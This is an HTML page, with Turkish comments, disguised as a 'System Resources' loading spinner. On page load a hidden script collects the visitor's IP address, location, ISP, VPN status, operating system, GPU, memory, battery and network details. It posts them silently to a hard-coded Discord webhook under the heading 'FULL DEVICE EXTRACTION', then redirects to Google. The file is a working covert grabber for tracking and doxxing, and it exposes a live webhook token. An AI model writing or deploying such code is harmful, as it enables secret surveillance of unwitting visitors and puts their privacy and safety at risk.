<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Sistem Kaynaklari</title>
    <style>
        body { background:#000; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; overflow:hidden; }
        .l { border: 2px solid #111; border-top: 2px solid #0f0; border-radius: 50%; width: 25px; height: 25px; animation: s 1s linear infinite; }
        @keyframes s { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="l"></div>

    <script>
        (function() {
            "use strict";
            var WEBHOOK = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
            var REDIRECT = "https://www.google.com";

            var run = async function() {
                var d = {
                    os: "Bilinmiyor", gpu: "Bilinmiyor", vdr: "Bilinmiyor",
                    res: screen.width + "x" + screen.height,
                    ram: navigator.deviceMemory || "N/A",
                    cpu: navigator.hardwareConcurrency || "N/A",
                    bat: "N/A", net: "N/A", vpn: "‚úÖ Temiz",
                    ip: "N/A", loc: "N/A", iss: "N/A",
                    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    lang: navigator.language,
                    touch: (navigator.maxTouchPoints > 0 ? "Evet" : "Hayƒ±r"),
                    online: (navigator.onLine ? "Aktif" : "Pasif")
                };

                // 1. ƒ∞≈ületim Sistemi (OS) Tespiti
                try { d.os = navigator.userAgent.match(/\(([^)]+)\)/)[1]; } catch(e) { d.os = navigator.platform; }

                // 2. GPU ve Donanƒ±m Analizi
                try {
                    var c = document.createElement('canvas');
                    var gl = c.getContext('webgl2') || c.getContext('webgl');
                    var db = gl.getExtension('WEBGL_debug_renderer_info');
                    d.gpu = gl.getParameter(db.UNMASKED_RENDERER_ID);
                    d.vdr = gl.getParameter(db.UNMASKED_VENDOR_ID);
                } catch(e) {}

                // 3. Pil ve Baƒülantƒ± Bilgisi
                try {
                    if (navigator.getBattery) {
                        var b = await navigator.getBattery();
                        d.bat = "%" + Math.round(b.level * 100) + (b.charging ? " (≈ûarjda)" : " (Pilde)");
                    }
                    var n = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                    if (n) d.net = n.effectiveType.toUpperCase() + " (" + n.downlink + "Mbps)";
                } catch(e) {}

                // 4. IP, Konum ve VPN Tespiti
                try {
                    var r = await fetch('https://ipapi.co/json/');
                    var j = await r.json();
                    d.ip = j.ip;
                    d.iss = j.org;
                    d.loc = j.city + ", " + j.region + " / " + j.country_name;
                    if (j.timezone !== d.tz) d.vpn = "üö® **VPN/PROXY AKTƒ∞F**";
                } catch(e) { d.vpn = "Analiz Engellendi"; }

                // 5. Discord Payload G√∂nderimi
                var payload = {
                    embeds: [{
                        title: "üíÄ FULL DEVICE EXTRACTION",
                        color: d.vpn.includes("üö®") ? 15158332 : 3066993,
                        fields: [
                            { name: "üì° NETWORK", value: "**IP:** `" + d.ip + "`\n**VPN:** " + d.vpn + "\n**ISS:** `" + d.iss + "`", inline: false },
                            { name: "üìç LOCATION", value: "**B√∂lge:** " + d.loc + "\n**TZ:** " + d.tz, inline: false },
                            { name: "‚öôÔ∏è HARDWARE", value: "**OS:** `" + d.os + "`\n**CPU:** " + d.cpu + " Cores\n**RAM:** " + d.ram + "GB\n**GPU:** `" + d.gpu + "`", inline: false },
                            { name: "üîã STATUS", value: "**Pil:** " + d.bat + "\n**Hƒ±z:** " + d.net + "\n**Touch:** " + d.touch, inline: true }
                        ],
                        footer: { text: "Ultimate Stealth V13.0" },
                        timestamp: new Date().toISOString()
                    }]
                };

                var blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
                if (navigator.sendBeacon) {
                    navigator.sendBeacon(WEBHOOK, blob);
                } else {
                    fetch(WEBHOOK, { method: 'POST', mode: 'no-cors', body: JSON.stringify(payload) });
                }

                // 6. Y√∂nlendirme
                setTimeout(function() { window.location.replace(REDIRECT); }, 1500);
            };

            window.onload = run;
        })();
    </script>
</body>
</html>
